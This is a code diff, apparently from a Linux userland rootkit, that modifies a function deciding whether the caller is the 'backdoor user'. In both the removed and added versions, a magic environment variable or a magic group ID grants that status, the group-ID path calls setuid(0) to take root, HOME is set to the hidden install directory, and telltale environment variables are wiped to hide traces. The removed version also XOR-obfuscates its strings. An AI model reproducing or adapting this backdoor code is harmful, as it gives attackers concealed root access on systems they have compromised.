@@ -1,41 +1,39 @@
 /* unset variables that we definitely do not need or want set */
 void unset_bad_vars(void){
-    for(int i = 0; i < UNSET_VARIABLES_SIZE; i++){
-        xor(current_variable, unset_variables[i]);
-        (void)unsetenv(current_variable);
-        clean(current_variable);
-    }
-    return;
+    for(int i = 0; i < UNSET_VARIABLES_SIZE; i++)
+        unsetenv(unset_variables[i]);
 }
 
 int is_bdusr(void){
 #ifndef HIDE_SELF
     return 1;
 #endif
-    if(bdusr != 0){
-        unset_bad_vars();
-        return bdusr;
+
+    int ret = 0;
+
+    if(getenv(BD_VAR) != NULL){
+        ret = 1;            /* there's zero point in doing the check */
+        goto end_isbdusr;   /* below too, after this. unset bad vars */
+                            /* and return.                           */
     }
 
-    xor(bd_var, BD_VAR);
-    /* allow usage of a magic environment variable to grant owner perm */
-    if(getenv(bd_var) != NULL && !not_user(0)) bdusr = 1;
-    clean(bd_var);
-
-    if(bdusr != 1 && getgid() == MAGIC_GID){
-        bdusr = 1;
-        (void)setuid(0); 
+    /* backdoor user shells, by default, don't set BD_VAR
+     * in the environment. so if the check above bore no
+     * fruits, we're most likely a proper backdoor user.
+     * set the HOME environment variable. */
+    if(getgid() == MAGIC_GID){
+        ret = 1;
+        setuid(0); 
 
         /* set our home environment variable */
-        char homebuf[PATH_MAX + 6];
-        xor(idir, INSTALL_DIR);
-        xor(home_str, HOME_VAR_STR);
-        (void)snprintf(homebuf, sizeof(homebuf) - 1, home_str, idir);
-        clean(home_str);
-        clean(idir);
-        (void)putenv(homebuf);
+        char homebuf[strlen(INSTALL_DIR) + strlen(HOME_VAR_STR) + 1];
+        snprintf(homebuf, sizeof(homebuf), HOME_VAR_STR, INSTALL_DIR);
+        /* built the full HOME variable's string, put
+         * it in the environment. */
+        putenv(homebuf);
     }
 
-    if(bdusr) unset_bad_vars();
-    return bdusr;
+end_isbdusr:
+    if(ret) unset_bad_vars();
+    return ret;
 }
